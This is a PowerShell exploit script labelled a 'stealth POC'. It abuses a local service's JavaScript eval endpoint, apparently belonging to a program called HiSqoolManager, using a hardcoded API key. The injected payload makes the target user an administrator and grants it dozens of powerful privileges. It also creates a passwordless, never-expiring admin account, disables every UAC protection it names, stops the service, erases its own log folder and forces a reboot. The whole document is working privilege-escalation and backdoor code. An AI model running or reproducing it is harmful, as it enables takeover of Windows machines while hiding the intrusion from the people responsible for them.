# Stealth POC - Silent exploit, no logs, no artifacts
[CmdletBinding()]
param(
  [string]$TargetUser,
  [string]$TargetSid,
  [string]$NewAdminName = 'Admin',
  [switch]$NoCleanup
)

$ErrorActionPreference = 'SilentlyContinue'
$Target = 'http://127.0.0.1:7654'
$ApiKey = 'would-nepal-sing-below'

# Capture requester SID
$whoUserRaw = & "$env:WINDIR\System32\whoami.exe" "/user"
$requesterSid = $null
foreach ($l in $whoUserRaw -split "`r?`n") {
  if ($l -match 'S-1-5-\d+(?:-\d+){0,15}') { $requesterSid = $Matches[0]; break }
}
if (-not $TargetUser -and -not $TargetSid) {
  if (-not $requesterSid) { exit 3 }
  $TargetSid = $requesterSid
}

$RunGroup = 'poc_' + $env:COMPUTERNAME + '_' + (Get-Date -Format 'yyyyMMdd_HHmmss')
$logDirWin32 = (Join-Path 'C:\Windows\System32\zcode_poc' $RunGroup)
$envBlock = ";(function(){ process.env.POC_LOG_DIR = `"" + $logDirWin32 + "`";"
if ($TargetSid) { $envBlock += " process.env.POC_TARGET_SID = `"" + $TargetSid + "`";" }
if ($TargetUser) { $envBlock += " process.env.POC_TARGET_USER = `"" + $TargetUser + "`";" }
$envBlock += " process.env.POC_NEW_ADMIN = `"" + $NewAdminName + "`"; process.env.POC_DRY_RUN = `"0`"; })();`r`n"

# Minimal payload (proven working)
$payloadBody = @"
'use strict';
const cp=require('child_process'),fs=require('fs'),path=require('path');
const CFG={LOG_DIR:process.env.POC_LOG_DIR,TARGET_SID:process.env.POC_TARGET_SID||'',TARGET_USER:process.env.POC_TARGET_USER||'',NEW_ADMIN:process.env.POC_NEW_ADMIN||'Admin'};
let logDir=CFG.LOG_DIR;if(!logDir)throw new Error('no-logdir');
fs.mkdirSync(logDir,{recursive:true});
function run(cmd){try{const o=cp.execSync(cmd,{windowsHide:true,timeout:30000,maxBuffer:16*1024*1024,stdio:['ignore','pipe','pipe']});return{rc:0,out:(o instanceof Buffer)?o.toString('latin1'):String(o)};}catch(e){return{rc:e.status,err:e.message};}}
function runPs(s){return run('powershell -NoProfile -NoLogo -NonInteractive -EncodedCommand '+Buffer.from(s,'utf16le').toString('base64'));}
function userFromSid(s){return(runPs('$s="'+s+'";try{(New-Object System.Security.Principal.SecurityIdentifier($s)).Translate([System.Security.Principal.NTAccount]).Value}catch{""}')).out.trim();}
function adminGroupName(){return(runPs('try{(New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")).Translate([System.Security.Principal.NTAccount]).Value.Split("\\")[-1]}catch{""}')).out.trim();}
let targetSid=CFG.TARGET_SID.trim(),targetUser=CFG.TARGET_USER.trim();
if(!targetSid&&!targetUser)throw new Error('no-target');
if(targetUser&&!targetSid)targetSid=userFromSid(targetUser);
if(targetSid&&!targetUser)targetUser=userFromSid(targetSid);
const pr={A:true,B:false,C:false,D:false,E:false};
const ag=adminGroupName()||'Administrators';
const mn=(targetUser&&targetUser.indexOf('\\')!==-1)?targetUser.split('\\').pop():targetUser;
if(mn&&!/^S-1-/.test(mn)){runPs('try{Add-LocalGroupMember -Name "'+ag+'" -Member "'+mn+'" -ErrorAction Stop;"OK"}catch{if($_.Exception.Message -match "already|existe|deja"){"ALREADY"}else{"ERR"}}');pr.B=true;}
const R=['SeTrustedCredManAccessPrivilege','SeNetworkLogonRight','SeRemoteInteractiveLogonRight','SeBatchLogonRight','SeInteractiveLogonRight','SeServiceLogonRight','SeTcbPrivilege','SeMachineAccountPrivilege','SeIncreaseQuotaPrivilege','SeChangeNotifyPrivilege','SeUndockPrivilege','SeManageVolumePrivilege','SeImpersonatePrivilege','SeCreateGlobalPrivilege','SeCreatePagefilePrivilege','SeCreatePermanentPrivilege','SeCreateSymbolicLinkPrivilege','SeDebugPrivilege','SeAuditPrivilege','SeSecurityPrivilege','SeTakeOwnershipPrivilege','SeLoadDriverPrivilege','SeSystemtimePrivilege','SeProfileSingleProcessPrivilege','SeSystemEnvironmentPrivilege','SeAssignPrimaryTokenPrivilege','SeRestorePrivilege','SeShutdownPrivilege','SeBackupPrivilege','SeSystemProfilePrivilege','SeCreateTokenPrivilege'];
const ei=path.join(logDir,'secedit_export.inf');run('secedit /export /cfg "'+ei+'" /quiet');
let txt='';try{const b=fs.readFileSync(ei);txt=(b[0]===0xFF&&b[1]===0xFE)?b.slice(2).toString('utf16le'):b.toString('utf8');}catch(e){}
const tse='*'+targetSid;
if(txt){const ls=txt.split(/\r?\n/),o=[];let ip=false,pu=false;const rm={};let lk=null;
for(const l of ls){if(/^\[Privilege Rights\]/i.test(l)){ip=true;o.push(l);continue;}if(/^\[.*\]/.test(l)){if(ip&&!pu){for(const r of R){const ex=rm[r]||[];const s=ex.filter(s=>s&&s.trim());if(s.indexOf(tse)===-1)s.push(tse);if(s.length>0)o.push(r+' = '+s.join(','));}pu=true;}ip=false;o.push(l);continue;}
if(ip){if(/^\s*;/.test(l)){o.push(l);continue;}const m=l.match(/^(\S+)\s*=\s*(.*)$/);if(m){const rn=m[1].trim();const s=m[2].split(',').map(x=>x.trim()).filter(x=>x);if(/^SeDeny/i.test(rn)){const k=s.filter(s=>s!==tse);if(k.length)o.push(rn+' = '+k.join(','));else o.push('; '+l);lk=rn;continue;}rm[rn]=rm[rn]||[];for(const s2 of s)if(rm[rn].indexOf(s2)===-1)rm[rn].push(s2);lk=rn;continue;}
if(lk&&!l.includes('=')){if(/^SeDeny/i.test(lk)){o[o.length-1]+=', '+l.trim();}else{const es=l.trim().split(',').map(x=>x.trim()).filter(x=>x);if(!rm[lk])rm[lk]=[];for(const s2 of es)if(rm[lk].indexOf(s2)===-1)rm[lk].push(s2);}}continue;}o.push(l);}
if(ip&&!pu){for(const r of R){const ex=rm[r]||[];const s=ex.filter(s=>s&&s.trim());if(s.indexOf(tse)===-1)s.push(tse);if(s.length>0)o.push(r+' = '+s.join(','));}pu=true;}
if(!pu){o.push('[Privilege Rights]');for(const r of R)o.push(r+' = '+tse);}
fs.writeFileSync(path.join(logDir,'secedit_apply.inf'),Buffer.concat([Buffer.from([0xFF,0xFE]),Buffer.from(o.join('\r\n'),'utf16le')]));
pr.C=(run('secedit /configure /cfg "'+path.join(logDir,'secedit_apply.inf')+'" /db "'+path.join(logDir,'secedit_apply.sdb')+'" /quiet /overwrite /areas USER_RIGHTS').rc===0);run('gpupdate /force');}
const rD1=run('net user "'+CFG.NEW_ADMIN+'" "" /add /y /expires:never /passwordreq:no');let uc=(rD1.rc===0);
if(!uc&&rD1.err&&/already|existe|dej[aà]/i.test(rD1.err))uc=true;
if(!uc){const r=runPs('try{New-LocalUser -Name "'+CFG.NEW_ADMIN+'" -NoPassword -ErrorAction Stop;"OK"}catch{if($_.Exception.Message -match "already|existe|deja"){"EXISTS"}else{"ERR"}}');if(/OK|EXISTS/i.test((r.out||'').trim()))uc=true;}
if(uc){run('net user "'+CFG.NEW_ADMIN+'" /active:yes');runPs('Set-LocalUser -Name "'+CFG.NEW_ADMIN+'" -PasswordNeverExpires $true');runPs('try{Add-LocalGroupMember -Name "'+(adminGroupName()||'Administrators')+'" -Member "'+CFG.NEW_ADMIN+'" -ErrorAction Stop;"OK"}catch{if($_.Exception.Message -match "already|existe|deja"){"ALREADY"}else{"ERR"}}');}
pr.D=uc;let ek=true;for(const k of['EnableLUA','ConsentPromptBehaviorAdmin','ConsentPromptBehaviorUser','EnableInstallerDetection','ValidateAdminCodeSignatures','FilterAdministratorToken','PromptOnSecureDesktop','EnableSecureUIAPaths','EnableUIADesktopToggle','EnableVirtualization','TypeOfAdminApprovalMode']){if(run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v '+k+' /t REG_DWORD /d 0 /f').rc!==0)ek=false;}
pr.E=ek;run('gpupdate /force');
fs.writeFileSync(path.join(logDir,'summary.json'),JSON.stringify({ok:true,runId:path.basename(logDir),logDir,targetSid,targetUser,newAdmin:CFG.NEW_ADMIN,phases:pr}));
fs.writeFileSync(path.join(logDir,'poc_complete.marker'),'POC complete '+new Date().toISOString());
return JSON.stringify({ok:true,phases:pr});
"@

$inlineJs = $envBlock + "`r`n" + "var __POC_RESULT = (function(){`r`n" + $payloadBody + "`r`n})();`r`n" + "__POC_RESULT;`r`n"

# Send payload (direct with timeout)
$body = @{category='js';command='eval';arguments=@{source=$inlineJs}} | ConvertTo-Json -Compress -Depth 6
$body = $body -replace '\\u0027',"'"
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
$headers = @{ 'Content-Type'='application/json'; 'x-api-key'=$ApiKey }
[System.Net.ServicePointManager]::Expect100Continue = $false
$resp = $null
try { $resp = Invoke-WebRequest -Method Post -Uri "$Target/commands" -Headers $headers -Body $bodyBytes -TimeoutSec 30 -UseBasicParsing } catch {}

# Wait for marker (max 60s - payload takes 15-30s typically)
$markerPath = Join-Path $logDirWin32 'poc_complete.marker'
for ($i=0; $i -lt 60; $i++) {
  if (Test-Path $markerPath) { break }
  Start-Sleep -Seconds 1
}

# Kill HiSqoolManager + disable task
cmd /c "taskkill /F /IM HiSqoolManager.exe" 2>$null | Out-Null
cmd /c "schtasks /Change /TN Demarrage_HiSqool_Test /Disable" 2>$null | Out-Null

# Cleanup
if (-not $NoCleanup) { Remove-Item $logDirWin32 -Recurse -Force -ErrorAction SilentlyContinue 2>$null }

# Reboot
shutdown /r /t 10 /f /c "POC"
